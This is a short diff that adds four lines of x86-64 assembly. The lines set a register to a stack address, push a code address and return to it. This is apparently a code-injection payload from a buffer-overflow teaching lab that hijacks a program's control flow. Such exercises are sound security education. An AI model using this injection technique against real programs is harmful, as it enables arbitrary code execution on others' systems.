@@ -1,0 +1,4 @@
+movq $0x5561dc93,%rdi
+sub $0x28,%rsp
+pushq $0x4018fa
+retq
